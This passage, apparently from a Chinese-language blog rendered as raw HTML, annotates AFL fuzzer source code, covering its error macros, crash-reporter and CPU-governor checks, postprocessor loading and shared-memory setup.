*/</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cRST <span class="string">&quot;\n&quot;</span>); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 致命错误 - 程序终止，显示详细位置信息 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FATAL(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(bSTOP RESET_G1 CURSOR_SHOW cRST cLRD <span class="meta-string">&quot;\n[-] PROGRAM ABORT : &quot;</span> \</span></span><br><span class="line"><span class="meta">         cBRI x); \  <span class="comment">/* 停止绘图模式，显示光标，亮红色错误标题 */</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(cLRD <span class="string">&quot;\n         Location : &quot;</span> cRST <span class="string">&quot;%s(), %s:%u\n\n&quot;</span>, \</span><br><span class="line">         __FUNCTION__, __FILE__, __LINE__); \  <span class="comment">/* 显示函数名、文件名、行号 */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>); \  <span class="comment">/* 退出程序，返回码 1 */</span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调用 abort() 产生核心转储 - 用于调试 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ABORT(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    SAYF(bSTOP RESET_G1 CURSOR_SHOW cRST cLRD <span class="meta-string">&quot;\n[-] PROGRAM ABORT : &quot;</span> \</span></span><br><span class="line"><span class="meta">         cBRI x); \</span></span><br><span class="line"><span class="meta">    SAYF(cLRD <span class="meta-string">&quot;\n    Stop location : &quot;</span> cRST <span class="meta-string">&quot;%s(), %s:%u\n\n&quot;</span>, \</span></span><br><span class="line"><span class="meta">         __FUNCTION__, __FILE__, __LINE__); \</span></span><br><span class="line"><span class="meta">    abort(); \  <span class="comment">/* 调用 abort() 而不是 exit()，会产生 core dump */</span></span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 系统错误 - 包含 perror() 的错误信息 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFATAL(x...) do &#123; \</span></span><br><span class="line"><span class="meta">    fflush(stdout); \  <span class="comment">/* 刷新标准输出缓冲区 */</span></span></span><br><span class="line">    <span class="built_in">SAYF</span>(bSTOP RESET_G1 CURSOR_SHOW cRST cLRD <span class="string">&quot;\n[-]  SYSTEM ERROR : &quot;</span> \</span><br><span class="line">         cBRI x); \</span><br><span class="line">    <span class="built_in">SAYF</span>(cLRD <span class="string">&quot;\n    Stop location : &quot;</span> cRST <span class="string">&quot;%s(), %s:%u\n&quot;</span>, \</span><br><span class="line">         __FUNCTION__, __FILE__, __LINE__); \</span><br><span class="line">    <span class="built_in">SAYF</span>(cLRD <span class="string">&quot;       OS message : &quot;</span> cRST <span class="string">&quot;%s\n&quot;</span>, <span class="built_in">strerror</span>(errno)); \  <span class="comment">/* 显示系统错误信息 */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 根据返回值选择 FATAL 或 PFATAL </span></span><br><span class="line"><span class="comment">   用于处理 read(), write() 等系统调用的错误 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RPFATAL(res, x...) do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (res &lt; 0) PFATAL(x); <span class="meta-keyword">else</span> FATAL(x); \  <span class="comment">/* res&lt;0 表示系统错误，否则是逻辑错误 */</span></span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 带错误检查的 write() 封装 </span></span><br><span class="line"><span class="comment">   确保写入指定长度的数据 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck_write(fd, buf, len, fn) do &#123; \</span></span><br><span class="line"><span class="meta">    u32 _len = (len); \</span></span><br><span class="line"><span class="meta">    s32 _res = write(fd, buf, _len); \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (_res != _len) RPFATAL(_res, <span class="meta-string">&quot;Short write to %s&quot;</span>, fn); \  <span class="comment">/* 写入不完整则报错 */</span></span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 带错误检查的 read() 封装</span></span><br><span class="line"><span class="comment">   确保读取指定长度的数据 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ck_read(fd, buf, len, fn) do &#123; \</span></span><br><span class="line"><span class="meta">    u32 _len = (len); \</span></span><br><span class="line"><span class="meta">    s32 _res = read(fd, buf, _len); \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (_res != _len) RPFATAL(_res, <span class="meta-string">&quot;Short read from %s&quot;</span>, fn); \  <span class="comment">/* 读取不完整则报错 */</span></span></span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ! _HAVE_DEBUG_H */</span></span></span><br></pre></td></tr></table></figure><p>这里有</p><p><code>WARNF</code> - 警告（黄色）</p><p><code>ACTF</code> - 动作（蓝色）</p><p><code>OKF</code> - 成功（绿色）</p><p><code>BADF</code> - 错误信息 (亮红色)</p><h2 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h2><p>这个函数的核心目的是确保系统的崩溃处理机制不会干扰 AFL 的正常运行，因为外部崩溃处理程序会导致检测延迟，影响 fuzzing 效率。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_crash_handling</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __APPLE__  <span class="comment">/* macOS/Darwin 系统的处理 */</span></span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Yuck! There appears to be no simple C API to query for the state of</span></span><br><span class="line"><span class="comment">     loaded daemons on MacOS X, and I&#x27;m a bit hesitant to do something</span></span><br><span class="line"><span class="comment">     more sophisticated, such as disabling crash reporting via Mach ports,</span></span><br><span class="line"><span class="comment">     until I get a box to test the code. So, for now, we check for crash</span></span><br><span class="line"><span class="comment">     reporting the awful way. */</span></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">   * 糟糕！macOS 上似乎没有简单的 C API 来查询已加载守护进程的状态，</span></span><br><span class="line"><span class="comment">   * 而且在没有测试机器之前，我不太愿意做更复杂的操作（比如通过 Mach 端口</span></span><br><span class="line"><span class="comment">   * 禁用崩溃报告）。所以现在，我们用一种很糟糕的方式来检查崩溃报告。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 使用 system() 调用 shell 命令来检查 ReportCrash 服务是否在运行</span></span><br><span class="line"><span class="comment">   * launchctl list: 列出所有运行的服务</span></span><br><span class="line"><span class="comment">   * grep -q &#x27;\.ReportCrash$&#x27;: 静默搜索以 .ReportCrash 结尾的服务</span></span><br><span class="line"><span class="comment">   * 如果找不到（返回非0），说明服务未运行，直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (system(<span class="string">&quot;launchctl list 2&gt;/dev/null | grep -q &#x27;\\.ReportCrash$&#x27;&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果 ReportCrash 服务正在运行，输出警告信息 */</span></span><br><span class="line">  SAYF(</span><br><span class="line">      <span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">      <span class="string">&quot;Whoops, your system is configured to forward crash notifications to an\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    external crash reporting utility. This will cause issues due to &quot;</span></span><br><span class="line">      <span class="string">&quot;the\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    extended delay between the fuzzed binary malfunctioning and this &quot;</span></span><br><span class="line">      <span class="string">&quot;fact\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    being relayed to the fuzzer via the standard waitpid() API.\n\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    To avoid having crashes misinterpreted as timeouts, please run the\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    following commands:\n\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    SL=/System/Library; PL=com.apple.ReportCrash\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    launchctl unload -w $&#123;SL&#125;/LaunchAgents/$&#123;PL&#125;.plist\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    sudo launchctl unload -w $&#123;SL&#125;/LaunchDaemons/$&#123;PL&#125;.Root.plist\n&quot;</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 警告内容翻译：</span></span><br><span class="line"><span class="comment">   * 哎呀，您的系统配置为将崩溃通知转发到外部崩溃报告工具。</span></span><br><span class="line"><span class="comment">   * 这会导致问题：从被测程序崩溃到通过标准 waitpid() API </span></span><br><span class="line"><span class="comment">   * 将此信息传递给 fuzzer 之间会有较长的延迟。</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 为避免崩溃被误判为超时，请运行以下命令：</span></span><br><span class="line"><span class="comment">   * （提供了禁用 ReportCrash 服务的命令）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 检查环境变量，如果用户明确表示不在乎崩溃丢失，则继续运行</span></span><br><span class="line"><span class="comment">   * 否则终止程序 */</span></span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES&quot;</span>))</span><br><span class="line">    FATAL(<span class="string">&quot;Crash reporter detected&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* Linux 和其他类 Unix 系统的处理 */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is Linux specific, but I don&#x27;t think there&#x27;s anything equivalent on</span></span><br><span class="line"><span class="comment">   * BSD, so we can just let it slide for now. */</span></span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">   * 这是 Linux 特有的，BSD 上似乎没有等效的机制，</span></span><br><span class="line"><span class="comment">   * 所以暂时可以忽略 BSD 系统。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 打开 core_pattern 文件</span></span><br><span class="line"><span class="comment">   * /proc/sys/kernel/core_pattern 控制核心转储文件的命名和处理方式 */</span></span><br><span class="line">  s32 fd = open(<span class="string">&quot;/proc/sys/kernel/core_pattern&quot;</span>, O_RDONLY);</span><br><span class="line">  u8 fchar;  <span class="comment">/* 存储读取的第一个字符 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 如果文件打开失败（可能在非 Linux 系统上），直接返回 */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  </span><br><span class="line">  ACTF(<span class="string">&quot;Checking core_pattern...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 读取 core_pattern 的第一个字符</span></span><br><span class="line"><span class="comment">   * 如果第一个字符是 &#x27;|&#x27;（管道符），表示核心转储会被发送到外部程序处理 */</span></span><br><span class="line">  <span class="keyword">if</span> (read(fd, &amp;fchar, <span class="number">1</span>) == <span class="number">1</span> &amp;&amp; fchar == <span class="string">&#x27;|&#x27;</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 输出警告信息 */</span></span><br><span class="line">    SAYF(</span><br><span class="line">        <span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">        <span class="string">&quot;Hmm, your system is configured to send core dump notifications to an\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    external utility. This will cause issues: there will be an &quot;</span></span><br><span class="line">        <span class="string">&quot;extended delay\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    between stumbling upon a crash and having this information &quot;</span></span><br><span class="line">        <span class="string">&quot;relayed to the\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    fuzzer via the standard waitpid() API.\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    To avoid having crashes misinterpreted as timeouts, please log in &quot;</span></span><br><span class="line">        <span class="string">&quot;as root\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    and temporarily modify /proc/sys/kernel/core_pattern, like so:\n\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    echo core &gt;/proc/sys/kernel/core_pattern\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 警告内容翻译：</span></span><br><span class="line"><span class="comment">     * 嗯，您的系统配置为将核心转储通知发送到外部程序。</span></span><br><span class="line"><span class="comment">     * 这会导致问题：从发现崩溃到通过标准 waitpid() API</span></span><br><span class="line"><span class="comment">     * 将信息传递给 fuzzer 之间会有较长的延迟。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 为避免崩溃被误判为超时，请以 root 身份登录并临时修改</span></span><br><span class="line"><span class="comment">     * /proc/sys/kernel/core_pattern，如下所示：</span></span><br><span class="line"><span class="comment">     * echo core &gt;/proc/sys/kernel/core_pattern</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 同样检查环境变量，决定是否继续运行 */</span></span><br><span class="line">    <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;Pipe at the beginning of &#x27;core_pattern&#x27;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  close(fd);</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* ^__APPLE__ */</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Linux就是检查了下 core_pattern 的第一个字符如果第一个字符是 ‘|’（管道符），表示核心转储会被发送到外部程序处理，为什么要这样做哪？有以下几个原因：</p><p><strong>性能影响</strong>：外部处理程序可能需要几秒钟来处理崩溃，严重降低 fuzzing 速度</p><p><strong>准确性影响</strong>：延迟可能导致 AFL 误判（崩溃 → 超时）</p><p><strong>资源消耗</strong>：外部崩溃报告工具会消耗额外的 CPU 和内存</p><h2 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h2><p>这个函数是用来检查 CPU 频率调节策略（CPU Scaling Governor），确保 CPU 运行在最佳性能模式，避免动态频率调节影响 fuzzing 性能。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">check_cpu_governor</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> FILE *f;</span><br><span class="line"> u8 tmp[<span class="number">128</span>];</span><br><span class="line"> u64 min = <span class="number">0</span>, max = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 检查环境变量，如果用户设置了 AFL_SKIP_CPUFREQ，跳过 CPU 频率检查 */</span></span><br><span class="line"> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_SKIP_CPUFREQ&quot;</span>))</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 打开 CPU0 的频率调节器（governor）文件</span></span><br><span class="line"><span class="comment">    scaling_governor 控制 CPU 频率调节策略 */</span></span><br><span class="line"> f = fopen(<span class="string">&quot;/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (!f)</span><br><span class="line">   <span class="keyword">return</span>;  <span class="comment">/* 如果文件不存在（可能系统不支持频率调节），直接返回 */</span></span><br><span class="line"> </span><br><span class="line"> ACTF(<span class="string">&quot;Checking CPU scaling governor...&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 读取当前的调节器策略 */</span></span><br><span class="line"> <span class="keyword">if</span> (!fgets(tmp, <span class="number">128</span>, f))</span><br><span class="line">   PFATAL(<span class="string">&quot;fgets() failed&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> fclose(f);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 如果调节器是 &quot;performance&quot; 或以 &quot;perf&quot; 开头，说明已经是最佳状态</span></span><br><span class="line"><span class="comment">    performance 模式会让 CPU 始终运行在最高频率 */</span></span><br><span class="line"> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(tmp, <span class="string">&quot;perf&quot;</span>, <span class="number">4</span>))</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 读取 CPU 最小频率设置 */</span></span><br><span class="line"> f = fopen(<span class="string">&quot;/sys/devices/system/cpu/cpu0/cpufreq/scaling_min_freq&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (f) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%llu&quot;</span>, &amp;min) != <span class="number">1</span>)</span><br><span class="line">     min = <span class="number">0</span>;  <span class="comment">/* 读取失败则设为 0 */</span></span><br><span class="line">   fclose(f);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 读取 CPU 最大频率设置 */</span></span><br><span class="line"> f = fopen(<span class="string">&quot;/sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span> (f) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%llu&quot;</span>, &amp;max) != <span class="number">1</span>)</span><br><span class="line">     max = <span class="number">0</span>;  <span class="comment">/* 读取失败则设为 0 */</span></span><br><span class="line">   fclose(f);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 如果最小频率等于最大频率，说明 CPU 频率是固定的，没有问题 */</span></span><br><span class="line"> <span class="keyword">if</span> (min == max)</span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* 输出警告信息，说明系统使用了动态频率调节</span></span><br><span class="line"><span class="comment">    这会影响 AFL 的性能，因为短生命周期的进程可能无法触发频率提升 */</span></span><br><span class="line"> SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">      <span class="string">&quot;Whoops, your system uses on-demand CPU frequency scaling, adjusted\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    between %llu and %llu MHz. Unfortunately, the scaling algorithm in &quot;</span></span><br><span class="line">      <span class="string">&quot;the\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    kernel is imperfect and can miss the short-lived processes spawned &quot;</span></span><br><span class="line">      <span class="string">&quot;by\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    afl-fuzz. To keep things moving, run these commands as root:\n\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    cd /sys/devices/system/cpu\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    echo performance | tee cpu*/cpufreq/scaling_governor\n\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    You can later go back to the original state by replacing &quot;</span></span><br><span class="line">      <span class="string">&quot;&#x27;performance&#x27; with\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    &#x27;ondemand&#x27;. If you don&#x27;t want to change the settings, set &quot;</span></span><br><span class="line">      <span class="string">&quot;AFL_SKIP_CPUFREQ\n&quot;</span></span><br><span class="line">      <span class="string">&quot;    to make afl-fuzz skip this check - but expect some performance &quot;</span></span><br><span class="line">      <span class="string">&quot;drop.\n&quot;</span>,</span><br><span class="line">      min / <span class="number">1024</span>, max / <span class="number">1024</span>);  <span class="comment">/* 将频率从 KHz 转换为 MHz 显示 */</span></span><br><span class="line"> </span><br><span class="line"> FATAL(<span class="string">&quot;Suboptimal CPU scaling governor&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我本地是没有这个文件的，原因可能是我使用的是虚拟机。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250910120159787.png"></p><h2 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h2><h3 id="核心目的"><a href="#核心目的" class="headerlink" title="核心目的"></a>核心目的</h3><p>设置 AFL 的<strong>后处理器（postprocessor）</strong>，允许用户提供自定义的测试用例后处理逻辑。</p><h3 id="后处理器的作用"><a href="#后处理器的作用" class="headerlink" title="后处理器的作用"></a>后处理器的作用</h3><p>AFL 后处理器是一个可选的自定义函数，在 AFL 生成测试用例后、发送给目标程序前被调用：</p><p>AFL 生成测试用例 → 后处理器修改 → 发送给目标程序</p><p>常见用途：</p><ol><li><strong>格式转换</strong>：将 AFL 的原始数据转换为特定格式</li><li><strong>校验和修复</strong>：修复数据的校验和、CRC等</li><li><strong>协议封装</strong>：添加协议头部、长度字段等</li><li><strong>数据压缩</strong>：对数据进行压缩或编码</li></ol><h3 id="函数接口"><a href="#函数接口" class="headerlink" title="函数接口"></a>函数接口</h3><p>后处理器必须实现以下接口：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">afl_postprocess</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">unsigned</span> <span class="keyword">int</span> *len)</span></span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><code>buf</code>：输入/输出缓冲区，包含要处理的数据</li><li><code>len</code>：指向长度的指针，输入时是原始长度，输出时是处理后的长度</li></ul><p>也就是这个函数是提供我们一个接口从而修改我们AFL生成的test case，以针对不同的情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setup_post</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *dh;                            <span class="comment">/* 动态库句柄 */</span></span><br><span class="line">  u8 *fn = getenv(<span class="string">&quot;AFL_POST_LIBRARY&quot;</span>); <span class="comment">/* 从环境变量获取后处理库路径 */</span></span><br><span class="line">  u32 tlen = <span class="number">6</span>; <span class="comment">/* 测试字符串长度（&quot;hello&quot; = 5字符 + 1） */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果没有设置 AFL_POST_LIBRARY 环境变量，跳过后处理器设置 */</span></span><br><span class="line">  <span class="keyword">if</span> (!fn)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  ACTF(<span class="string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 dlopen 动态加载指定的共享库</span></span><br><span class="line"><span class="comment">     RTLD_NOW: 立即解析所有符号，而不是延迟到使用时 */</span></span><br><span class="line">  dh = dlopen(fn, RTLD_NOW);</span><br><span class="line">  <span class="keyword">if</span> (!dh)</span><br><span class="line">    FATAL(<span class="string">&quot;%s&quot;</span>, dlerror()); <span class="comment">/* 加载失败则显示详细错误信息并退出 */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从加载的库中查找 &quot;afl_postprocess&quot; 函数</span></span><br><span class="line"><span class="comment">     这是 AFL 后处理器必须实现的标准接口函数 */</span></span><br><span class="line">  post_handler = dlsym(dh, <span class="string">&quot;afl_postprocess&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!post_handler)</span><br><span class="line">    FATAL(<span class="string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 进行快速测试，确保函数能正常工作</span></span><br><span class="line"><span class="comment">     使用测试字符串 &quot;hello&quot;，长度为 6（包含 \0）</span></span><br><span class="line"><span class="comment">     这样做是为了现在发现问题，而不是在后续 fuzzing 过程中崩溃 */</span></span><br><span class="line">  post_handler(<span class="string">&quot;hello&quot;</span>, &amp;tlen);</span><br><span class="line"></span><br><span class="line">  OKF(<span class="string">&quot;Postprocessor installed successfully.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我没有设置AFL_POST_LIBRARY环境变量所以跳过了该函数</p><h2 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h2><p>这个函数注意是初始化virgin位图数组，并设置共享内存。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8 *shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化 virgin 位图数组</span></span><br><span class="line"><span class="comment">     virgin_bits: 跟踪哪些代码路径从未被执行过</span></span><br><span class="line"><span class="comment">     virgin_tmout: 跟踪哪些路径导致超时</span></span><br><span class="line"><span class="comment">     virgin_crash: 跟踪哪些路径导致崩溃</span></span><br><span class="line"><span class="comment">     初始化为 255 (0xFF) 表示所有路径都未被访问 */</span></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap)</span><br><span class="line">    <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 创建共享内存段</span></span><br><span class="line"><span class="comment">     IPC_PRIVATE: 创建私有共享内存（只能通过返回的 ID 访问）</span></span><br><span class="line"><span class="comment">     MAP_SIZE: 共享内存大小（通常是 64KB）</span></span><br><span class="line"><span class="comment">     IPC_CREAT | IPC_EXCL: 创建新的共享内存，如果已存在则失败</span></span><br><span class="line"><span class="comment">     0600: 权限（所有者可读写） */</span></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 注册退出时的清理函数，确保共享内存被释放 */</span></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将共享内存 ID 转换为字符串 */</span></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置环境变量 SHM_ENV_VAR (通常是 &quot;__AFL_SHM_ID&quot;)</span></span><br><span class="line"><span class="comment">     插桩后的目标程序会读取这个环境变量来找到共享内存</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     dumb_mode: 非插桩模式（对未插桩的二进制文件进行黑盒测试）</span></span><br><span class="line"><span class="comment">     如果在 dumb_mode 下，不设置环境变量，避免目标程序检测到插桩 */</span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode)</span><br><span class="line">    setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);<span class="comment">//释放刚才生成的字符串，已经用不到了</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将共享内存附加到当前进程的地址空间</span></span><br><span class="line"><span class="comment">     shm_id: 共享内存标识符</span></span><br><span class="line"><span class="comment">     NULL: 让系统选择附加地址</span></span><br><span class="line"><span class="comment">     0: 标志位（可读写）</span></span><br><span class="line"><span class="comment">     返回值 trace_bits 是共享内存在进程地址空间中的起始地址 */</span></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="keyword">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对virgin_bits，virgin_tmout，virgin_crash进行初始化，每个字节都初始化为0xff</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250910150158186.png"></p><p>这里用到了shmget()，这里介绍一下，接着还有一个atexit()</p><h3 id="shmget"><a href="#shmget" class="headerlink" title="shmget"></a>shmget</h3><p><code>shmget()</code> 是 Linux/Unix 系统中用于<strong>创建或获取共享内存段</strong>的系统调用。它是 System V IPC（进程间通信）机制的一部分。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span 